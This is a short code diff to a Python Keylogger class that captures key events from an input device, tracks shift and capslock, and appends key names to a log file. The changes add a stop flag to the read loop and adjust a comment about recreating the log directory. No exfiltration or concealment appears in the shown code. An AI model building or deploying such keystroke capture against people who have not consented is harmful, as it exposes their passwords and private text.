@@ -10,6 +10,7 @@ class Keylogger:
             'shift': False,
             'capslock': False
         }
+        self.running = True
         # Ensure the directory exists
         os.makedirs(os.path.dirname(self.log_path), exist_ok=True)
     
@@ -38,6 +39,10 @@ class Keylogger:
             return
         
         for event in device.read_loop():
+            # Check stop flag
+            if not self.running:
+                break
+            
             if event.type == ecodes.EV_KEY:
                 self.update_modifiers(event.code, event.value)
                 
@@ -54,7 +59,7 @@ class Keylogger:
                         output += "[CAPS] "
                     output += f"{key_name} "
                     
-                    # FIX: Ensure directory exists before each write
+                    # FIX: Handle directory deletion gracefully
                     try:
                         os.makedirs(os.path.dirname(self.log_path), exist_ok=True)
                         with open(self.log_path, "a") as f:
